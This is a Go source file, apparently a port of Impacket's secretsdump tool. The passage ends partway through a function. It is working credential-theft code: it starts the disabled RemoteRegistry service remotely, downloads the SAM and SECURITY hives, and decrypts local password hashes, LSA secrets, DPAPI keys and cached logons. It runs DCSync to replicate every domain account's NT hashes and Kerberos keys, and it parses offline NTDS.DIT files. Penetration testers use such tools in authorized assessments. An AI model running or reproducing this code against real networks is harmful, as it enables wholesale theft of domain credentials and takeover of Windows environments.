// SPDX-License-Identifier: Apache-2.0

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"time"

	"gopacket/pkg/dcerpc"
	"gopacket/pkg/dcerpc/drsuapi"
	"gopacket/pkg/dcerpc/epmapper"
	"gopacket/pkg/dcerpc/svcctl"
	"gopacket/pkg/dcerpc/winreg"
	"gopacket/pkg/ese"
	"gopacket/pkg/flags"
	"gopacket/pkg/registry"
	"gopacket/pkg/session"
	"gopacket/pkg/smb"
)

var (
	justDCUser = flag.String("just-dc-user", "", "Extract only this user's secrets (default: all users)")
	justDC     = flag.Bool("just-dc", false, "Only perform DCSync (skip SAM/LSA extraction)")
	justDCNTLM = flag.Bool("just-dc-ntlm", false, "Extract only NTDS.DIT data (NTLM hashes only)")

	// Output flags (outputfile is provided by flags.Parse() via opts.OutputFile)
	pwdLastSet  = flag.Bool("pwd-last-set", false, "Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data")
	userStatus  = flag.Bool("user-status", false, "Display whether or not the user is disabled")
	dumpHistory = flag.Bool("history", false, "Dump password history, and LSA secrets OldVal")

	// Skip flags
	skipSAM      = flag.Bool("skip-sam", false, "Do NOT parse the SAM hive on remote system")
	skipSecurity = flag.Bool("skip-security", false, "Do NOT parse the SECURITY hive on remote system")

	// Offline mode flags
	samFile      = flag.String("sam", "", "Path to SAM hive file (offline mode)")
	systemFile   = flag.String("system", "", "Path to SYSTEM hive file (offline mode, required for -sam or -security)")
	securityFile = flag.String("security", "", "SECURITY hive to parse")
	ntdsFile     = flag.String("ntds", "", "Path to NTDS.DIT file (offline mode)")
)

// outputWriter writes to both stdout and an optional file (tee behavior).
type outputWriter struct {
	file *os.File
}

// newOutputWriter creates a writer for the given file path. If path is empty, writes to stdout only.
func newOutputWriter(path string) (*outputWriter, error) {
	if path == "" {
		return &outputWriter{}, nil
	}
	f, err := os.Create(path)
	if err != nil {
		return nil, fmt.Errorf("failed to create output file %s: %v", path, err)
	}
	return &outputWriter{file: f}, nil
}

func (w *outputWriter) Close() {
	if w.file != nil {
		w.file.Close()
	}
}

// Printf writes to stdout always, and to the file if open.
func (w *outputWriter) Printf(format string, a ...interface{}) {
	fmt.Printf(format, a...)
	if w.file != nil {
		fmt.Fprintf(w.file, format, a...)
	}
}

// FilePrintf writes to the file only (used when stdout gets extra decorations like pwdLastSet).
func (w *outputWriter) FilePrintf(format string, a ...interface{}) {
	if w.file != nil {
		fmt.Fprintf(w.file, format, a...)
	}
}

// Writer returns an io.Writer that writes to both stdout and the file.
func (w *outputWriter) Writer() io.Writer {
	if w.file != nil {
		return io.MultiWriter(os.Stdout, w.file)
	}
	return os.Stdout
}

// filetimeToTime converts a Windows FILETIME (100-nanosecond intervals since 1601-01-01) to time.Time.
func filetimeToTime(ft int64) time.Time {
	// Windows epoch: January 1, 1601
	// Unix epoch: January 1, 1970
	// Difference: 116444736000000000 (100-nanosecond intervals)
	const windowsUnixDiff = 116444736000000000
	if ft <= 0 || ft == 0x7FFFFFFFFFFFFFFF {
		return time.Time{}
	}
	unixNano := (ft - windowsUnixDiff) * 100
	return time.Unix(0, unixNano).UTC()
}

// outputFileBase holds the -outputfile value from flags.Parse()
var outputFileBase string

func main() {
	opts := flags.Parse()
	outputFileBase = opts.OutputFile

	// Check if running in offline mode
	offlineMode := *samFile != "" || *securityFile != "" || *ntdsFile != ""

	if offlineMode {
		// Offline mode: parse local hive files
		if err := dumpOffline(); err != nil {
			log.Fatalf("[-] Offline dump failed: %v", err)
		}
		return
	}

	// Remote mode: need a target
	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		log.Fatalf("[-] Error parsing target string: %v", err)
	}

	opts.ApplyToSession(&target, &creds)

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			log.Fatal(err)
		}
	}

	// -just-dc-ntlm implies -just-dc
	if *justDCNTLM {
		*justDC = true
	}

	// Remote registry extraction (SAM/LSA) - unless -just-dc is specified
	if !*justDC {
		if err := dumpRemoteRegistry(target, creds); err != nil {
			log.Printf("[-] Remote registry extraction failed: %v", err)
		}
	}

	// DCSync extraction
	if err := dumpDCSync(target, creds); err != nil {
		log.Printf("[-] DCSync failed: %v", err)
	}

	fmt.Println("[*] Cleaning up...")
}

func dumpRemoteRegistry(target session.Target, creds session.Credentials) error {
	// Connect via SMB
	smbClient := smb.NewClient(target, &creds)
	if err := smbClient.Connect(); err != nil {
		return fmt.Errorf("SMB connection failed: %v", err)
	}
	defer smbClient.Close()

	// Start Remote Registry service via SVCCTL
	serviceWasStarted := false
	serviceStopped := false
	serviceDisabled := false

	svcPipe, err := smbClient.OpenPipe("svcctl")
	if err != nil {
		fmt.Printf("[-] Warning: Could not open svcctl pipe: %v\n", err)
	} else {
		svcRPC := dcerpc.NewClient(svcPipe)
		if err := svcRPC.Bind(svcctl.UUID, svcctl.MajorVersion, svcctl.MinorVersion); err != nil {
			fmt.Printf("[-] Warning: Could not bind svcctl: %v\n", err)
			svcPipe.Close()
		} else {
			sc, err := svcctl.NewServiceController(svcRPC)
			if err != nil {
				fmt.Printf("[-] Warning: Could not create service controller: %v\n", err)
			} else {
				defer sc.Close()

				// Open Remote Registry service with config access
				svcHandle, err := sc.OpenService("RemoteRegistry",
					svcctl.SERVICE_START|svcctl.SERVICE_STOP|svcctl.SERVICE_QUERY_STATUS|
						svcctl.SERVICE_QUERY_CONFIG|svcctl.SERVICE_CHANGE_CONFIG)
				if err != nil {
					fmt.Printf("[-] Warning: Could not open RemoteRegistry service: %v\n", err)
				} else {
					defer sc.CloseServiceHandle(svcHandle)

					// Check current status
					status, err := sc.QueryServiceStatus(svcHandle)
					if err != nil {
						fmt.Printf("[-] Warning: Could not query service status: %v\n", err)
					} else {
						if status.CurrentState == svcctl.SERVICE_STOPPED {
							fmt.Println("[*] Service RemoteRegistry is in stopped state")

							// Check if service is disabled
							config, err := sc.QueryServiceConfig(svcHandle)
							if err == nil && config.StartType == svcctl.SERVICE_DISABLED {
								fmt.Println("[*] Service RemoteRegistry is disabled, enabling it")
								serviceDisabled = true
								if err := sc.ChangeServiceConfig(svcHandle, &svcctl.ChangeServiceConfigParams{
									ServiceType: svcctl.SERVICE_NO_CHANGE, StartType: svcctl.SERVICE_DEMAND_START, ErrorControl: svcctl.SERVICE_NO_CHANGE,
								}); err != nil {
									fmt.Printf("[-] Warning: Could not enable RemoteRegistry: %v\n", err)
								}
							}

							fmt.Println("[*] Starting service RemoteRegistry")
							if err := sc.StartService(svcHandle); err != nil {
								fmt.Printf("[-] Warning: Could not start RemoteRegistry: %v\n", err)
							} else {
								serviceWasStarted = true
								// Wait a bit for service to start
								for i := 0; i < 10; i++ {
									status, _ := sc.QueryServiceStatus(svcHandle)
									if status != nil && status.CurrentState == svcctl.SERVICE_RUNNING {
										break
									}
									// Small delay would be nice here but we'll just retry
								}
							}
						} else {
							fmt.Printf("[*] Service RemoteRegistry is already %s\n", svcctl.GetServiceState(status.CurrentState))
						}
						serviceStopped = status.CurrentState == svcctl.SERVICE_STOPPED
					}
				}
			}
		}
		svcPipe.Close()
	}

	fmt.Println("[*] Retrieving class info for SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD")

	// Initialize remote operations
	remoteOps, err := winreg.NewRemoteOps(smbClient, &creds)
	if err != nil {
		return fmt.Errorf("failed to initialize remote registry: %v", err)
	}
	defer remoteOps.Close()

	// Defer stopping the service and restoring disabled state if we changed it
	defer func() {
		if serviceWasStarted && serviceStopped {
			// Reconnect to stop service and restore config
			svcPipe, err := smbClient.OpenPipe("svcctl")
			if err == nil {
				svcRPC := dcerpc.NewClient(svcPipe)
				if svcRPC.Bind(svcctl.UUID, svcctl.MajorVersion, svcctl.MinorVersion) == nil {
					if sc, err := svcctl.NewServiceController(svcRPC); err == nil {
						accessRights := uint32(svcctl.SERVICE_STOP)
						if serviceDisabled {
							accessRights |= svcctl.SERVICE_CHANGE_CONFIG
						}
						if svcHandle, err := sc.OpenService("RemoteRegistry", accessRights); err == nil {
							fmt.Println("[*] Stopping service RemoteRegistry")
							sc.StopService(svcHandle)

							if serviceDisabled {
								fmt.Println("[*] Restoring the disabled state for service RemoteRegistry")
								sc.ChangeServiceConfig(svcHandle, &svcctl.ChangeServiceConfigParams{
									ServiceType: svcctl.SERVICE_NO_CHANGE, StartType: svcctl.SERVICE_DISABLED, ErrorControl: svcctl.SERVICE_NO_CHANGE,
								})
							}

							sc.CloseServiceHandle(svcHandle)
						}
						sc.Close()
					}
				}
				svcPipe.Close()
			}
		}
	}()

	// Get boot key
	bootKey, err := remoteOps.GetBootKey()
	if err != nil {
		return fmt.Errorf("failed to get boot key: %v", err)
	}
	fmt.Printf("[*] Target system bootKey: 0x%s\n", hex.EncodeToString(bootKey))

	// Dump SAM (unless -skip-sam)
	if !*skipSAM {
		fmt.Println("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)")

		samWriter, err := newOutputWriter(samOutputPath())
		if err != nil {
			fmt.Printf("[-] Failed to create SAM output file: %v\n", err)
		} else {
			defer samWriter.Close()

			// Save SAM hive
			samFile, err := remoteOps.SaveHive("SAM")
			if err != nil {
				fmt.Printf("[-] Failed to save SAM hive: %v\n", err)
			} else {
				// Download SAM hive
				samData, err := remoteOps.DownloadHive(samFile)
				if err != nil {
					fmt.Printf("[-] Failed to download SAM hive: %v\n", err)
				} else {
					// Parse SAM hive
					samHive, err := registry.Open(samData)
					if err != nil {
						fmt.Printf("[-] Failed to parse SAM hive: %v\n", err)
					} else {
						// Dump users
						users, err := registry.DumpSAM(samHive, bootKey)
						if err != nil {
							fmt.Printf("[-] Failed to dump SAM: %v\n", err)
						} else {
							for _, user := range users {
								lmHash := hex.EncodeToString(user.LMHash)
								ntHash := hex.EncodeToString(user.NTHash)
								samWriter.Printf("%s:%d:%s:%s:::\n", user.Username, user.RID, lmHash, ntHash)
							}
						}
					}
				}
			}
		}
	} else {
		fmt.Println("[*] Skipping SAM hive extraction")
	}

	// Dump LSA secrets (unless -skip-security)
	if !*skipSecurity {
		fmt.Println("[*] Dumping LSA Secrets")

		secretsWriter, err := newOutputWriter(secretsOutputPath())
		if err != nil {
			fmt.Printf("[-] Failed to create secrets output file: %v\n", err)
		} else {
			defer secretsWriter.Close()

			cachedWriter, err := newOutputWriter(cachedOutputPath())
			if err != nil {
				fmt.Printf("[-] Failed to create cached output file: %v\n", err)
			} else {
				defer cachedWriter.Close()

				// Save SECURITY hive
				secFile, err := remoteOps.SaveHive("SECURITY")
				if err != nil {
					fmt.Printf("[-] Failed to save SECURITY hive: %v\n", err)
				} else {
					// Download SECURITY hive
					secData, err := remoteOps.DownloadHive(secFile)
					if err != nil {
						fmt.Printf("[-] Failed to download SECURITY hive: %v\n", err)
					} else {
						// Parse SECURITY hive
						secHive, err := registry.Open(secData)
						if err != nil {
							fmt.Printf("[-] Failed to parse SECURITY hive: %v\n", err)
						} else {
							// Get domain info for machine account output
							domainInfo, _ := registry.GetDomainInfo(secHive)

							// Dump LSA secrets
							secrets, err := registry.DumpLSASecrets(secHive, bootKey)
							if err != nil {
								fmt.Printf("[-] Failed to dump LSA secrets: %v\n", err)
							} else {
								for _, secret := range secrets {
									if len(secret.Value) == 0 {
										continue
									}
									// Format output based on secret type
									if strings.Contains(secret.Name, "$MACHINE.ACC") {
										// Get computer name
										computerName := domainInfo.ComputerName
										if computerName == "" {
											computerName = strings.TrimSuffix(secret.Name, ".ACC")
										}

										// Derive all keys from machine password
										machineKeys := registry.DeriveMachineAccountKeys(secret.Value,
											domainInfo.DNSDomainName, computerName)

										// Output in Impacket format: DOMAIN\COMPUTERNAME$
										prefix := domainInfo.NetBIOSName + "\\" + computerName + "$"
										if machineKeys.AES256Key != nil {
											secretsWriter.Printf("%s:aes256-cts-hmac-sha1-96:%s\n", prefix, hex.EncodeToString(machineKeys.AES256Key))
										}
										if machineKeys.AES128Key != nil {
											secretsWriter.Printf("%s:aes128-cts-hmac-sha1-96:%s\n", prefix, hex.EncodeToString(machineKeys.AES128Key))
										}
										if machineKeys.DESKey != nil {
											secretsWriter.Printf("%s:des-cbc-md5:%s\n", prefix, hex.EncodeToString(machineKeys.DESKey))
										}
										secretsWriter.Printf("%s:plain_password_hex:%s\n", prefix, hex.EncodeToString(secret.Value))
										if machineKeys.NTHash != nil {
											secretsWriter.Printf("%s:aad3b435b51404eeaad3b435b51404ee:%s:::\n", prefix, hex.EncodeToString(machineKeys.NTHash))
										}
									} else if secret.Name == "DPAPI_SYSTEM" {
										keys := registry.ParseDPAPISecret(secret.Value)
										if keys != nil {
											secretsWriter.Printf("dpapi_machinekey:0x%s\n", hex.EncodeToString(keys.MachineKey))
											secretsWriter.Printf("dpapi_userkey:0x%s\n", hex.EncodeToString(keys.UserKey))
										}
									} else if secret.Name == "NL$KM" {
										secretsWriter.Printf("NL$KM:%s\n", hex.EncodeToString(secret.Value))
									} else {
										// Generic secret output
										secretsWriter.Printf("[*] %s\n", secret.Name)
										secretsWriter.Printf("    %s\n", hex.EncodeToString(secret.Value))
									}
								}
							}

							// Dump cached credentials
							cachedCreds, err := registry.DumpCachedCredentials(secHive, bootKey)
							if err != nil {
								fmt.Printf("[-] Failed to dump cached credentials: %v\n", err)
							} else if len(cachedCreds) > 0 {
								fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
								for _, cred := range cachedCreds {
									if cred.Username != "" {
										cachedWriter.Printf("%s/%s:%s\n", cred.Domain, cred.Username, hex.EncodeToString(cred.EncryptedHash))
									}
								}
							}
						}
					}
				}
			}
		}
	} else {
		fmt.Println("[*] Skipping SECURITY hive extraction")
	}

	return nil
}

func dumpDCSync(target session.Target, creds session.Credentials) error {
	// Query Endpoint Mapper for DRSUAPI port
	port, err := epmapper.MapTCPEndpoint(target.Host, drsuapi.UUID, drsuapi.MajorVersion)
	if err != nil {
		return fmt.Errorf("failed to map DRSUAPI endpoint: %v", err)
	}

	// Connect to DRSUAPI via TCP
	transport, err := dcerpc.DialTCP(target.Host, port)
	if err != nil {
		return fmt.Errorf("failed to connect to DRSUAPI: %v", err)
	}
	defer transport.Close()

	// Bind with authentication (Packet Privacy)
	rpcClient := dcerpc.NewClientTCP(transport)
	if creds.UseKerberos {
		// Use Kerberos authentication
		if err := rpcClient.BindAuthKerberos(drsuapi.UUID, drsuapi.MajorVersion, drsuapi.MinorVersion, &creds, target.Host); err != nil {
			return fmt.Errorf("BindAuthKerberos failed: %v", err)
		}
	} else {
		// Use NTLM authentication (password or hash)
		if err := rpcClient.BindAuth(drsuapi.UUID, drsuapi.MajorVersion, drsuapi.MinorVersion, &creds); err != nil {
			return fmt.Errorf("BindAuth failed: %v", err)
		}
	}

	// DsBind
	bindResult, err := drsuapi.DsBind(rpcClient)
	if err != nil {
		return fmt.Errorf("DsBind failed: %v", err)
	}

	// Get DC info including DSA GUID
	domainDNS := creds.Domain
	dcInfo, err := drsuapi.DsDomainControllerInfo(rpcClient, bindResult.Handle, domainDNS)
	if err != nil {
		return fmt.Errorf("DsDomainControllerInfo failed: %v", err)
	}

	// Get domain DN using DsCrackNames
	if domainDNS == "" {
		return fmt.Errorf("domain name required for DCSync")
	}

	domainDN, err := drsuapi.GetDomainDN(rpcClient, bindResult.Handle, domainDNS)
	if err != nil {
		return fmt.Errorf("failed to resolve domain DN: %v", err)
	}

	fmt.Println("[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)")
	fmt.Println("[*] Using the DRSUAPI method to get NTDS.DIT secrets")

	// Create output writers for NTDS and Kerberos keys
	ntdsWriter, err := newOutputWriter(ntdsOutputPath())
	if err != nil {
		return fmt.Errorf("failed to create NTDS output file: %v", err)
	}
	defer ntdsWriter.Close()

	kerbWriter, err := newOutputWriter(ntdsKerberosOutputPath())
	if err != nil {
		return fmt.Errorf("failed to create Kerberos output file: %v", err)
	}
	defer kerbWriter.Close()

	// Get session key for decryption (works with both NTLM and Kerberos)
	sessionKey := rpcClient.GetSessionKey()
	netbiosDomain := strings.ToUpper(strings.Split(creds.Domain, ".")[0])

	if *justDCUser != "" {
		// Single user mode
		dumpSingleUser(rpcClient, bindResult.Handle, domainDN, dcInfo.NtdsDsaObjectGuid, sessionKey, netbiosDomain, ntdsWriter, kerbWriter, *justDCUser)
	} else {
		// All users mode
		dumpAllUsers(rpcClient, bindResult.Handle, domainDN, dcInfo.NtdsDsaObjectGuid, sessionKey, netbiosDomain, ntdsWriter, kerbWriter)
	}

	return nil
}

func dumpSingleUser(rpcClient *dcerpc.Client, hBind []byte, domainDN string, dsaGuid [16]byte, sessionKey []byte, netbiosDomain string, ntdsWriter, kerbWriter *outputWriter, username string) {
	// Crack username to GUID
	var targetName string

	// Check if already a GUID
	if strings.HasPrefix(username, "{") && strings.HasSuffix(username, "}") {
		targetName = username
	} else {
		// Try to crack the name to GUID
		nt4Name := netbiosDomain + "\\" + username
		crackResults, err := drsuapi.DsCrackNames(rpcClient, hBind,
			drsuapi.DS_NT4_ACCOUNT_NAME, drsuapi.DS_UNIQUE_ID_NAME, []string{nt4Name})

		if err == nil {
			for _, r := range crackResults {
				if r.Status == drsuapi.DS_NAME_NO_ERROR && r.Name != "" {
					targetName = r.Name
				}
			}
		}

		if targetName == "" {
			// Fall back to DN
			targetName = fmt.Sprintf("CN=%s,CN=Users,%s", username, domainDN)
		}
	}

	result, err := drsuapi.DsGetNCChanges(rpcClient, hBind, domainDN, targetName, dsaGuid, sessionKey)
	if err != nil {
		log.Fatalf("[-] DsGetNCChanges failed: %v", err)
	}

	printObjects(result.Objects, netbiosDomain, ntdsWriter, kerbWriter)
}

func dumpAllUsers(rpcClient *dcerpc.Client, hBind []byte, domainDN string, dsaGuid [16]byte, sessionKey []byte, netbiosDomain string, ntdsWriter, kerbWriter *outputWriter) {
	var usn drsuapi.USNVector
	totalObjects := 0

	for {
		result, err := drsuapi.DsGetNCChangesAll(rpcClient, hBind, domainDN, dsaGuid, sessionKey, usn)
		if err != nil {
			log.Fatalf("[-] DsGetNCChanges failed: %v", err)
		}

		printObjects(result.Objects, netbiosDomain, ntdsWriter, kerbWriter)
		totalObjects += len(result.Objects)

		if !result.MoreData {
			break
		}

		// Continue with the next batch using the USN watermark
		usn = result.HighWaterMark
	}
}

// formatSuffix builds the optional (pwdLastSet=...) (status=...) suffix for stdout display.
// These annotations are stdout-only per Impacket behavior: -pwd-last-set and -user-status
// don't apply to -outputfile data.
func formatSuffix(obj drsuapi.ReplicatedObject) string {
	var suffix string
	if *pwdLastSet {
		t := filetimeToTime(obj.PwdLastSet)
		if t.IsZero() {
			suffix += " (pwdLastSet=never)"
		} else {
			suffix += fmt.Sprintf(" (pwdLastSet=%s)", t.Format("2006-01-02 15:04:05"))
		}
	}
	if *userStatus {
		if obj.UserAccountControl&0x0002 != 0 {
			suffix += " (status=Disabled)"
		} else {
			suffix += " (status=Enabled)"
		}
	}
	return suffix
}

func printObjects(objects []drsuapi.ReplicatedObject, netbiosDomain string, ntdsWriter, kerbWriter *outputWriter) {
	// Collect Kerberos keys for output at the end
	type kerbKey struct {
		username string
		keyType  string
		keyValue string
	}
	var kerberosKeys []kerbKey

	for _, obj := range objects {
		// Skip objects without credentials
		if len(obj.NTHash) == 0 && len(obj.LMHash) == 0 {
			continue
		}

		lmHash := "aad3b435b51404eeaad3b435b51404ee" // Empty LM hash
		ntHash := "31d6cfe0d16ae931b73c59d7e0c089c0" // Empty NT hash

		if len(obj.LMHash) == 16 {
			lmHash = hex.EncodeToString(obj.LMHash)
		}
		if len(obj.NTHash) == 16 {
			ntHash = hex.EncodeToString(obj.NTHash)
		}

		// Format: domain\user:RID:lmhash:nthash:::
		hashLine := fmt.Sprintf("%s\\%s:%d:%s:%s:::", netbiosDomain, obj.SAMAccountName, obj.RID, lmHash, ntHash)
		suffix := formatSuffix(obj)

		// Write to file without suffix (Impacket: -pwd-last-set/-user-status don't apply to -outputfile)
		ntdsWriter.FilePrintf("%s\n", hashLine)
		// Write to stdout with optional suffix
		fmt.Printf("%s%s\n", hashLine, suffix)

		// Dump password history if -history flag is set
		if *dumpHistory {
			// NT hash history (skip index 0, that's the current hash)
			for i := 1; i < len(obj.NTHashHistory); i++ {
				histLM := "aad3b435b51404eeaad3b435b51404ee"
				histNT := hex.EncodeToString(obj.NTHashHistory[i])
				// Match corresponding LM history if available
				if i < len(obj.LMHashHistory) {
					histLM = hex.EncodeToString(obj.LMHashHistory[i])
				}
				histLine := fmt.Sprintf("%s\\%s_history%d:%d:%s:%s:::", netbiosDomain, obj.SAMAccountName, i-1, obj.RID, histLM, histNT)
				ntdsWriter.FilePrintf("%s\n", histLine)
				fmt.Printf("%s%s\n", histLine, suffix)
			}
		}

		// Collect Kerberos keys (skip if -just-dc-ntlm)
		if !*justDCNTLM {
			for _, key := range obj.KerberosKeys {
				kerberosKeys = append(kerberosKeys, kerbKey{
					username: obj.SAMAccountName,
					keyType:  drsuapi.GetKeyTypeName(key.KeyType),
					keyValue: hex.EncodeToString(key.KeyValue),
				})
			}
		}
	}

	// Output Kerberos keys (without domain prefix to match Impacket format)
	// Skip entirely if -just-dc-ntlm
	if !*justDCNTLM && len(kerberosKeys) > 0 {
		fmt.Println("[*] Kerberos keys grabbed")
		for _, key := range kerberosKeys {
			kerbLine := fmt.Sprintf("%s:%s:%s", key.username, key.keyType, key.keyValue)
			kerbWriter.FilePrintf("%s\n", kerbLine)
			fmt.Println(kerbLine)
		}
	}
}

// Output path helpers — return empty string if -outputfile not set
func samOutputPath() string {
	if outputFileBase == "" {
		return ""
	}
	return outputFileBase + ".sam"
}

func secretsOutputPath() string {
	if outputFileBase == "" {
		return ""
	}
	return outputFileBase + ".secrets"
}

func cachedOutputPath() string {
	if outputFileBase == "" {
		return ""
	}
	return outputFileBase + ".cached"
}

func ntdsOutputPath() string {
	if outputFileBase == "" {
		return ""
	}
	return outputFileBase + ".ntds"
}

func ntdsKerberosOutputPath() string {
	if outputFileBase == "" {
		return ""
	}
	return outputFileBase + ".ntds.kerberos"
}

// dumpOffline handles offline parsing of registry hives and NTDS.DIT
func dumpOffline() error {
	// SYSTEM hive is required for boot key
	if *systemFile == "" && (*samFile != "" || *securityFile != "") {
		return fmt.Errorf("-system is required when using -sam or -security")
	}

	var bootKey []byte
	var err error

	// Load SYSTEM hive for boot key
	if *systemFile != "" {
		var systemData []byte
		systemData, err = os.ReadFile(*systemFile)
		if err != nil {
			return fmt.Errorf("failed to read SYSTEM hive: %v", err)
		}

		var systemHive *registry.Hive
		systemHive, err = registry.Open(systemData)
		if err != nil {
			return fmt.Errorf("failed to parse SYSTEM hive: %v", err)
		}

		bootKey, err = registry.GetBootKey(systemHive)
		if err != nil {
			return fmt.Errorf("failed to get boot key: %v", err)
		}
		fmt.Printf("[*] Target system bootKey: 0x%s\n", hex.EncodeToString(bootKey))
	}
	_ = err // silence unused variable warning if no hives specified

	// Dump SAM hashes
	if *samFile != "" {
		fmt.Println("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)")

		samWriter, err := newOutputWriter(samOutputPath())
		if err != nil {
			fmt.Printf("[-] Failed to create SAM output file: %v\n", err)
		} else {
			defer samWriter.Close()

			samData, err := os.ReadFile(*samFile)
			if err != nil {
				return fmt.Errorf("failed to read SAM hive: %v", err)
			}

			samHive, err := registry.Open(samData)
			if err != nil {
				return fmt.Errorf("failed to parse SAM hive: %v", err)
			}

			users, err := registry.DumpSAM(samHive, bootKey)
			if err != nil {
				return fmt.Errorf("failed to dump SAM: %v", err)
			}

			for _, user := range users {
				lmHash := hex.EncodeToString(user.LMHash)
				ntHash := hex.EncodeToString(user.NTHash)
				samWriter.Printf("%s:%d:%s:%s:::\n", user.Username, user.RID, lmHash, ntHash)
			}
		}
	}

	// Dump LSA secrets
	if *securityFile != "" {
		fmt.Println("[*] Dumping LSA Secrets")

		secretsWriter, err := newOutputWriter(secretsOutputPath())
		if err != nil {
			fmt.Printf("[-] Failed to create secrets output file: %v\n", err)
		} else {
			defer secretsWriter.Close()

			cachedWriter, err := newOutputWriter(cachedOutputPath())
			if err != nil {
				fmt.Printf("[-] Failed to create cached output file: %v\n", err)
			} else {
				defer cachedWriter.Close()

				secData, err := os.ReadFile(*securityFile)
				if err != nil {
					return fmt.Errorf("failed to read SECURITY hive: %v", err)
				}

				secHive, err := registry.Open(secData)
				if err != nil {
					return fmt.Errorf("failed to parse SECURITY hive: %v", err)
				}

				// Get domain info for machine account output
				domainInfo, _ := registry.GetDomainInfo(secHive)

				// Dump LSA secrets
				secrets, err := registry.DumpLSASecrets(secHive, bootKey)
				if err != nil {
					fmt.Printf("[-] Failed to dump LSA secrets: %v\n", err)
				} else {
					for _, secret := range secrets {
						if len(secret.Value) == 0 {
							continue
						}
						// Format output based on secret type
						if strings.Contains(secret.Name, "$MACHINE.ACC") {
							// Get computer name
							computerName := domainInfo.ComputerName
							if computerName == "" {
								computerName = strings.TrimSuffix(secret.Name, ".ACC")
							}

							// Derive all keys from machine password
							machineKeys := registry.DeriveMachineAccountKeys(secret.Value,
								domainInfo.DNSDomainName, computerName)

							// Output in Impacket format: DOMAIN\COMPUTERNAME$
							prefix := domainInfo.NetBIOSName + "\\" + computerName + "$"
							if machineKeys.AES256Key != nil {
								secretsWriter.Printf("%s:aes256-cts-hmac-sha1-96:%s\n", prefix, hex.EncodeToString(machineKeys.AES256Key))
							}
							if machineKeys.AES128Key != nil {
								secretsWriter.Printf("%s:aes128-cts-hmac-sha1-96:%s\n", prefix, hex.EncodeToString(machineKeys.AES128Key))
							}
							if machineKeys.DESKey != nil {
								secretsWriter.Printf("%s:des-cbc-md5:%s\n", prefix, hex.EncodeToString(machineKeys.DESKey))
							}
							secretsWriter.Printf("%s:plain_password_hex:%s\n", prefix, hex.EncodeToString(secret.Value))
							if machineKeys.NTHash != nil {
								secretsWriter.Printf("%s:aad3b435b51404eeaad3b435b51404ee:%s:::\n", prefix, hex.EncodeToString(machineKeys.NTHash))
							}
						} else if secret.Name == "DPAPI_SYSTEM" {
							keys := registry.ParseDPAPISecret(secret.Value)
							if keys != nil {
								secretsWriter.Printf("dpapi_machinekey:0x%s\n", hex.EncodeToString(keys.MachineKey))
								secretsWriter.Printf("dpapi_userkey:0x%s\n", hex.EncodeToString(keys.UserKey))
							}
						} else if secret.Name == "NL$KM" {
							secretsWriter.Printf("NL$KM:%s\n", hex.EncodeToString(secret.Value))
						} else {
							// Generic secret output
							secretsWriter.Printf("[*] %s\n", secret.Name)
							secretsWriter.Printf("    %s\n", hex.EncodeToString(secret.Value))
						}
					}
				}

				// Dump cached credentials
				cachedCreds, err := registry.DumpCachedCredentials(secHive, bootKey)
				if err != nil {
					fmt.Printf("[-] Failed to dump cached credentials: %v\n", err)
				} else if len(cachedCreds) > 0 {
					fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
					for _, cred := range cachedCreds {
						if cred.Username != "" {
							cachedWriter.Printf("%s/%s:%s\n", cred.Domain, cred.Username, hex.EncodeToString(cred.EncryptedHash))
						}
					}
				}
			}
		}
	}

	// Dump NTDS.DIT
	if *ntdsFile != "" {
		// -just-dc-ntlm implies -just-dc for offline too
		if *justDCNTLM {
			*justDC = true
		}

		if bootKey == nil {
			return fmt.Errorf("-system is required when using -ntds")
		}
		if err := dumpNTDS(*ntdsFile, bootKey); err != nil {
			return fmt.Errorf("failed to dump NTDS.DIT: %v", err)
		}
	}

	return nil
}

// dumpNTDS parses NTDS.DIT and extracts hashes
func dumpNTDS(ntdsPath string, bootKey []byte) error {
	fmt.Println("[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)")
	fmt.Println("[*] Searching for pekList, be patient")

	// Create output writers
	ntdsWriter, err := newOutputWriter(ntdsOutputPath())
	if err != nil {
		return fmt.Errorf("failed to create NTDS output file: %v", err)
	}
	defer ntdsWriter.Close()

	kerbWriter, err := newOutputWriter(ntdsKerberosOutputPath())
	if err != nil {
		return fmt.Errorf("failed to create Kerberos output file: %v", err)
	}
	defer kerbWriter.Close()

	// Open NTDS.DIT file
	ntdsData, err := os.ReadFile(ntdsPath)
	if err != nil {
		return fmt.Errorf("failed to read NTDS.DIT: %v", err)
	}

	// Parse ESE database
	db, err := ese.Open(ntdsData)
	if err != nil {
		return fmt.Errorf("failed to parse NTDS.DIT: %v", err)
	}

	// Get datatable
	datatable, err := db.OpenTable("datatable")
	if err != nil {
		return fmt.Errorf("failed to open datatable: %v", err)
	}

	// Extract PEK (Password Encryption Key)
	pek, err := extractPEK(datatable, bootKey)
	if err != nil {
		return fmt.Errorf("failed to extract PEK: %v", err)
	}
	fmt.Println("[*] PEK found and target system is in Online mode")

	// Extract user records and hashes
	users, kerberosKeys := extractNTDSHashes(datatable, pek)

	// Output hashes
	for _, user := range users {
		hashLine := fmt.Sprintf("%s:%d:%s:%s:::", user.SAMAccountName, user.RID, user.LMHash, user.NTHash)
		ntdsWriter.FilePrintf("%s\n", hashLine)
		fmt.Println(hashLine)
	}

	// Output Kerberos keys (skip if -just-dc-ntlm)
	if !*justDCNTLM && len(kerberosKeys) > 0 {
		fmt.Println("[*] Kerberos keys grabbed")
		for _, key := range kerberosKeys {
			kerbLine := fmt.Sprintf("%s:%s:%s", key.username, key.keyType, key.keyValue)
			kerbWriter.FilePrintf("%s\n", kerbLine)
			fmt.Println(kerbLine)
		}
	}

	return nil
}

type ntdsUser struct {
	SAMAccountName string
	RID            uint32
	LMHash         string
	NTHash         string
}

type ntdsKerbKey struct {
	username string
	keyType  string
	keyValue string
}

func extractPEK(datatable *ese.Table, bootKey []byte) ([]byte, error) {
